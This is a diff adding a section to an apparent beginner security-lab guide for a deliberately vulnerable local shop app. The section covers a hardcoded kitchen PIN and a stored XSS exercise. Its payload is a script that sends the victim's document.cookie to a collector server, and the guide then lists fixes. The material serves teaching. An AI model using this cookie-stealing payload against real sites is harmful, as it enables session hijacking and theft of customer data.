@@ -60,6 +60,32 @@ docker compose exec shop sh -c "npm ls --all 2>/dev/null | head -40"
 - How many packages does the shop depend on, directly and indirectly?
 - Luca wrote maybe 150 lines himself. Who wrote the rest? Do you know them?
 
+### Kitchen dashboard – weak login & stored XSS (easy)
+
+The cooks process orders at `/kitchen`. It has two beginner-level bugs.
+
+**1. Weak PIN.** Open http://localhost:3000/kitchen – it asks for a PIN. Find it in the code:
+
+```bash
+grep -n "PIN" app/server.js
+```
+
+Log in with that PIN. You now see every customer's name, address and phone number.
+
+**2. Stored XSS via the order notes.** The "Special requests" field is shown on the
+kitchen board without escaping, so HTML in it runs in the cook's browser.
+
+1. Order a pizza. In *Special requests*, paste:
+   ```html
+   <script>new Image().src="http://localhost:8000/xss?c="+document.cookie</script>
+   ```
+2. Open the collector (http://localhost:8000) in one tab.
+3. Open the kitchen board (http://localhost:3000/kitchen) in another – you are the cook.
+4. The collector receives the cook's session cookie `kitchen=ok`.
+
+> With that cookie an attacker is in the kitchen without knowing the PIN.
+> Fixes: escape output, keep no PIN in the code, set cookies `HttpOnly` + `SameSite`.
+
 ### A2 – A typo with consequences (Typosquatting)
 
 Look closely at the dependencies in `app/package.json`. One of them is **not** the
